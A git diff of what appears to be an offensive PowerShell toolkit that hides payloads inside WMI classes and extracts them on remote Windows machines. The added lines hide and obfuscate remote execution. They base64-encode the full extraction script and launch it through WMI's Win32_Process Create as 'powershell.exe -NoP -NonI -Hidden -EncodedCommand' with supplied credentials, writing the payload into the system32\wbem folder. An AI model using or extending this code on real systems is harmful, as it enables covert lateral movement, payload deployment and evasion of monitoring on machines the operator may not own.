@@ -61,11 +61,11 @@ Function Invoke-WMIRemoteExtract {
 
     [CmdletBinding()]
     Param(
-        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
+        [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
             [string]$Target = ".",
         [Parameter(Mandatory=$true, HelpMessage="Name of payload to extract.")]
             [string]$PayloadName,
-        [Parameter(Mandatory=$true, HelpMessage="Class where payload is stored.")]
+        [Parameter(Mandatory=$false, HelpMessage="Class where payload is stored.")]
             [string]$ClassName = "WMIFS",
         [Parameter(Mandatory=$true, HelpMessage="Location on remote file system to place extracted file.")]
             [string]$Destination = "$env:windir\system32\wbem\",
@@ -74,11 +74,14 @@ Function Invoke-WMIRemoteExtract {
     )
     Begin {
         $InvokeRetrieveFile = "Function Invoke-RetrieveFile {" + (Get-Command Invoke-RetrieveFile).Definition + "}"
+        Write-Verbose $InvokeRetrieveFile
         $ConvertFromBase64 = "Function ConvertFrom-Base64 {" + (Get-Command ConvertFrom-Base64).Definition + "}"
         $Command1 = "`$File = Invoke-RetrieveFile -FileName $PayloadName -ClassName $ClassName -Verbose"
         $Command2 = "ConvertFrom-Base64 -WriteToDisk -EncodedText `$File -FileName $Destination\$PayloadName -Verbose"
-        $RemoteCommand = "powershell.exe -NoP -NonI -Command '$InvokeRetrieveFile; $ConvertFromBase64; $Command1; $Command2;'"
+        $Base64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$InvokeRetrieveFile; $ConvertFromBase64; $Command1; $Command2;"))
+        $RemoteCommand = "powershell.exe -NoP -NonI -Hidden -EncodedCommand $Base64"
     } Process {
+        #$RemoteCommand | Invoke-Expression 
         Invoke-WmiMethod -Namespace "root\cimv2" -Class Win32_Process -Name Create -ArgumentList $RemoteCommand -Credential $Credential
     } End { 
     }
@@ -647,7 +650,7 @@ Function ConvertFrom-EncryptedText{
 }
 
 
-function Invoke-Parallel {
+function local:Invoke-Parallel {
     <#
     .SYNOPSIS
         Function to control parallel processing using runspaces
